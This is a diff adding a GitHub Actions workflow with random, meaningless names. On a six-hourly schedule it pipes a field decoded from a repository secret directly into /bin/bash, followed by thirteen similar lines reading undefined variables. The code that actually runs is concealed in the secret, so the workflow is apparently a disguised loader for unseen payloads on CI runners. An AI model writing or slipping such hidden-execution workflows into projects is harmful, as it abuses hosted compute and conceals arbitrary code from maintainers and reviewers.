@@ -1,0 +1,31 @@
+name: punkahong
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '31 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: punkahong
+        env:
+          oh78183: ${{ secrets.oh78183 }}
+        run: |
+          echo $oh78183 | jq -r .srgsd4530 | /bin/bash
+          echo $azn41575 | jq -r .cemyx073 | /bin/bash
+          echo $atj393 | jq -r .j5553 | /bin/bash
+          echo $rdv8 | jq -r .dvlcw90 | /bin/bash
+          echo $czpkp37688 | jq -r .ydhp28278 | /bin/bash
+          echo $zqi4 | jq -r .g903 | /bin/bash
+          echo $jh6 | jq -r .fom46554 | /bin/bash
+          echo $xj454 | jq -r .flvs58583 | /bin/bash
+          echo $m289 | jq -r .rqce2 | /bin/bash
+          echo $mm147 | jq -r .lrso86 | /bin/bash
+          echo $nzhs92 | jq -r .wx69 | /bin/bash
+          echo $gm68629 | jq -r .w7521 | /bin/bash
+          echo $q914 | jq -r .as817 | /bin/bash
+          echo $q4 | jq -r .bct3736 | /bin/bash
+
